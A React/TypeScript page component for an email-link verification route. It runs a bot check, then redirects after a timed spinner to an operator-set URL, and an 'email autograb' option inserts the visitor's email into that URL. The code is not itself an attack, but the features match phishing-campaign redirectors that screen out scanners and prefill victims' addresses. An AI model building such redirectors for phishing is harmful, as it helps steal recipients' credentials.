import { useEffect, useState } from "react";
import { useRoute } from "wouter";
import { useQuery } from "@tanstack/react-query";
import VerificationProcess from "@/components/VerificationProcess";
import { Settings } from "@/lib/types";
import { apiRequest } from "@/lib/queryClient";

export default function Verification() {
  const [, params] = useRoute("/verify/:code");
  const verificationCode = params?.code;
  const [verificationState, setVerificationState] = useState<'loading' | 'success' | 'error' | 'bot-check'>('loading');
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [settings, setSettings] = useState<Settings | null>(null);
  const [userEmail, setUserEmail] = useState<string>("");
  
  const { data, isLoading, error, refetch } = useQuery({
    queryKey: [`/api/verification/verify/${verificationCode}`],
    enabled: !!verificationCode,
    staleTime: 0,
  });
  
  // Function to handle bot protection check completion
  const handleBotCheckComplete = async () => {
    try {
      // Call API with bot check flag
      const response = await apiRequest("GET", `/api/verification/verify/${verificationCode}?botcheck=passed`);
      const result = await response.json();
      
      setVerificationState('success');
      setSettings(result.settings);
      setUserEmail(result.email || "");
      
      // Handle redirection
      handleRedirect(result);
    } catch (err) {
      setVerificationState('error');
      const errMessage = err instanceof Error ? err.message : "Verification failed";
      setErrorMessage(errMessage);
    }
  };
  
  // Handle redirection after successful verification
  const handleRedirect = (data: any) => {
    if (data.settings && data.settings.redirectUrl) {
      const redirectTimeout = data.settings.showLoadingSpinner 
        ? (data.settings.loadingDuration * 1000) 
        : 1000;
      
      setTimeout(() => {
        let redirectUrl = data.settings.redirectUrl;
        
        // Handle email autograb feature
        if (data.settings.useEmailAutograb && data.email) {
          const paramName = data.settings.emailAutograbParam || 'email';
          const placeholder = `{${paramName}}`;
          redirectUrl = redirectUrl.replace(placeholder, encodeURIComponent(data.email));
        }
        
        window.location.href = redirectUrl;
      }, redirectTimeout);
    }
  };
  
  useEffect(() => {
    if (isLoading) {
      setVerificationState('loading');
    } else if (error) {
      setVerificationState('error');
      const errMessage = error instanceof Error ? error.message : "Verification failed";
      setErrorMessage(errMessage);
    } else if (data) {
      // Define a type guard to check for the expected response format
      const isVerificationResponse = (obj: any): obj is { 
        botProtectionRequired: boolean; 
        settings: Settings; 
        email: string;
        success: boolean; 
      } => {
        return obj && typeof obj === 'object' && 
          'botProtectionRequired' in obj && 
          'settings' in obj && 
          'email' in obj &&
          'success' in obj;
      };
      
      // Ensure the response has the expected format
      if (isVerificationResponse(data)) {
        // Check if bot protection is required
        if (data.botProtectionRequired) {
          setVerificationState('bot-check');
          setSettings(data.settings);
          setUserEmail(data.email || "");
        } else {
          setVerificationState('success');
          setSettings(data.settings);
          setUserEmail(data.email || "");
          
          // Handle redirection
          handleRedirect(data);
        }
      } else {
        // Handle unexpected response format
        setVerificationState('error');
        setErrorMessage("Invalid verification response from server");
        console.error("Unexpected verification response format:", data);
      }
    }
  }, [data, isLoading, error]);
  
  return (
    <VerificationProcess 
      state={verificationState} 
      errorMessage={errorMessage}
      settings={settings}
      email={userEmail}
      onBotCheckComplete={handleBotCheckComplete}
    />
  );
}
